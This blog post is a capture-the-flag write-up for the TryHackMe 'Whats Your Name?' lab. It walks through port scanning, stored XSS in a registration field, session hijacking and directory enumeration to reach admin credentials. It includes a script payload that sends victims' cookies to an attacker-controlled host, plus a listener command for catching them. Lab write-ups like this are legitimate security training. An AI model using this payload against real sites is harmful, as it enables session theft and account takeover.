---
title: "Write-up: Whats Your Name? (TryHackMe)"
date: 2025-10-16 20:00:00 +0700
categories: [CTF, Writeup]
tags: [tryhackme, ctf, xss, session-hijack, websec]
---

# Hello Jekyll 

This is my write-up — **biusa_mrdarkroot** — for the **"Whats Your Name?"** challenge on TryHackMe. The write-up documents client-side exploitation (stored XSS), session hijacking, and sensitive data discovery, with commands and notes to reproduce the steps in a lab environment.

---

##  Objectives

- Discover and exploit a stored XSS in the **Name** field  
- Capture a victim's cookie via payload → perform session hijacking  
- Enumerate hidden directories to find admin credentials → access dashboard → obtain admin flag

---

<p align="center">
  <img src="https://github.com/user-attachments/assets/70742578-8746-428f-8674-614b9a7a2da8" alt="Screenshot-demo" width="80%">
</p>

---

## ✨Environment & Tools

- Platform: TryHackMe — room: *Whats Your Name?* (subscription required)  
- Attacker machine: Kali Linux  
- Tools: `nmap`, `gobuster`, browser (DevTools), `python3` (simple http server)

---

##  Step 1 — Start the machine & port scan

- Click **Start Machine** on TryHackMe to obtain the target IP.  
- Run a quick port scan:

```bash
nmap -sS <MACHINE_IP>
```

Typical result: ports **22 (SSH)**, **80 (HTTP)**, **8081 (HTTP)** are open.

---

##  Step 2 — Find stored XSS & inject payload

- Add hosts to `/etc/hosts` if the room provides domain names, then visit the web app.  
- Open the **Register** page and test input fields. The **Name** field appears to accept HTML/JS — try a stored XSS payload:

```html
<script>document.location="http://<KALI_IP>:1337/cookie?c="+document.cookie</script>
```

> Replace `<KALI_IP>` with your Kali machine IP.

<img width="942" height="442" alt="image"  />
<p align="center">
  <img src="https://github.com/user-attachments/assets/a4d39333-f37c-437c-af36-d1e4c93a4f6f" alt="Screenshot-demo" width="80%">
</p>


- On Kali, run a simple HTTP server to listen for incoming requests:

```bash
python3 -m http.server 1337
```
<img width="946" height="158" alt="image"  />

<p align="center">
  <img src="https://github.com/user-attachments/assets/8473196e-c855-4b7c-b755-88f365a84433" alt="Screenshot-demo" width="80%">
</p>

If a moderator or another privileged user views the registration details containing the payload, their browser will make a request to your server including their cookies in the URL. You will see the cookie value in the server logs.

---

##  Step 3 — Session hijacking

- Capture the cookie from the incoming request (for example `PHPSESSID=<value>`).  
- Open your browser's DevTools → Storage → Cookies.  
- Create or update a cookie named `PHPSESSID` with the captured value, then reload the page.  
- If the cookie is valid, the server will recognize you as that user — in this room I became **Moderator** and retrieved the **moderator flag**.

---

##  Step 4 — Directory enumeration & admin flag

- While logged in as Moderator, a subdomain (for example `login.worldwap.thm`) may be discovered — add it to `/etc/hosts`.  
- Use `gobuster` to enumerate directories:

```bash
gobuster dir -u http://login.worldwap.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,py,txt,html
```

- Results often include `admin.py` (which contains admin information/credentials) and `login.php`.  
- Use the credentials from `admin.py` to log into `login.php` → become **admin** → the dashboard contains the **admin flag**.

---

##  Results

- Obtained the **Moderator flag** via stored XSS + session hijacking.  
- Enumerated hidden files to find admin credentials → logged in as admin → obtained the **Admin flag**.

<p align="center">
  <img src="https://github.com/user-attachments/assets/9b027f7f-cb9b-41ea-b42d-4db240ee3c4b" alt="Screenshot-demo" width="80%">
</p>


##  Suggested screenshots to include

- Before/after rendering of the payload on the page.  
- Server logs on Kali showing the request URL with cookie.  
- DevTools → Cookies showing the injected `PHPSESSID`.  
- Moderator / Admin dashboard showing flags.

---

##  Quick commands

- Port scan: `nmap -sS <MACHINE_IP>`  
- Listen for callback: `python3 -m http.server 1337`  
- Directory enumeration:  
  `gobuster dir -u http://login.worldwap.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,py,txt,html`

---
